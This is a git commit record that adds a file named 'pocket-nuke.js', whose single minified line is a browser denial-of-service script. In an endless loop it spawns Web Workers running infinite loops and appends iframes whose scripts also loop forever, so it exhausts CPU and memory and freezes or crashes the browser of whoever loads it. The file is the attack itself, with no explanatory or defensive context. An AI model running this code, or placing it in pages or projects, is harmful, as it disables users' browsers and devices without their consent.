17c8f5d8da6484783df72f502475b8278f2093fa
jagobainda <jagobainda@gmail.com>
2025-06-15 21:22:09 +0200

    first commit

---
+++ src/pocket-nuke.js
@@ -0,0 +1,1 @@
+(()=>{for(_=URL.createObjectURL(new Blob(["for(;;);"],{type:"text/javascript"}));;)new Worker(_),(f=document.createElement("iframe")).src="data:text/html,"+escape("<script>for(;;);</script>"),document.body.appendChild(f)})();
